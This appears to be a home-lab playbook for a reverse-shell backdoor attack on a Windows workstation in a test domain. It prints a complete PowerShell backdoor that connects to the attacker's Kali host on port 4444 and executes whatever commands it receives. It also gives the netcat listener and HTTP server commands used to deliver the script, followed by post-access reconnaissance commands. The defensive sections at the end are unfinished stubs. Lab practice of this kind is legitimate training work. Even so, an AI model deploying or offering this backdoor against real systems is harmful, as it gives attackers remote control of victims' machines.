
# Reverse Shell Backdoor Attack Playbook

## Overview

This project demonstrates how to create and deploy a malicious PowerShell script to establish a reverse shell on a Windows workstation. The attacker uses Kali Linux to serve the payload and capture the connection, giving them remote access to the victim's machine.

- **Target:** Windows Workstation (SOC.LAB domain)
  - **IP Address:** 192.168.10.20
  - **Domain:** SOC.LAB
- **Attacker:** Kali Linux
  - **IP Address:** 192.168.20.30

## Objective
1. Create a malicious PowerShell script (malicious.ps1) to establish a reverse shell backdoor.
2. Use a web server to serve the payload to the target Windows machine.
3. Make the Windows user download and execute the malicious script.
4. Gain remote access to the victim's machine and execute commands of the attacker's choice.

## Attack Execution Timeline

### 1. **Create Malicious PowerShell Payload**

Firstly, I created a malicious PowerShell script (`malicious.ps1`) that establishes a reverse shell back to my Kali's machine, based on this [git](https://github.com/das-lab/mpsd) and [post](https://learn.microsoft.com/en-us/defender-endpoint/run-detection-test?source=recommendations&view=o365-worldwide):

```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.20.30", 4444)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

# Send a message to confirm the connection
$writer.WriteLine("Connected to backdoor!")
$writer.Flush()

while ($true) {
    # Receive command from the attacker
    $command = $reader.ReadLine()
    
    # If the command is "exit", close the connection
    if ($command -eq "exit") {
        break
    }
    
    # Execute the command on the Windows machine and capture output
    $output = Invoke-Expression $command 2>&1
    
    # Send the output back to the attacker
    $writer.WriteLine($output)
    $writer.Flush()
}

# Close the connection
$client.Close()
```

### 2. **Set Up HTTP Server to Serve Payload**

Once the payload script was created, I hosted an HTTP web server just to simulate the Windows user to download malware through a link. Meanwhile I used Netcat to listen for an incoming connection from the reverse shell:
```bash
python3 -m http.server 80
```
```bash
nc -lvnp 4444
```

### 4. **Victim Downloads and Executes the Malicious Payload**

After the Windows user has downloaded and executed the malicious payload,it bypasses the PowerShell execution policy and downloads the malicious script from the attacker’s web server to the target machine. Once executed, the script initiates the reverse shell and connects back to my kali’s machine.

### 5. **Execute Commands on the Target Machine**

After successfully establishing the reverse shell, I could run every command that i wanted to on that Windows machine or gather information about the system. Some useful commands executed during the attack include:

- **`whoami`** – To confirm the user currently logged in:
  ```bash
  whoami
  ```

- **`tasklist`** – To list all running processes:
  ```bash
  tasklist | Out-String
  ```

- **`net user`** – To list all user accounts on the system:
  ```bash
  net user | Format-Table
  ```

- **`net user labadmin`** – To get detailed information about the `labadmin` user:
  ```bash
  net user labadmin
  ```



Pfsense rules...
CrowdSec ruless...
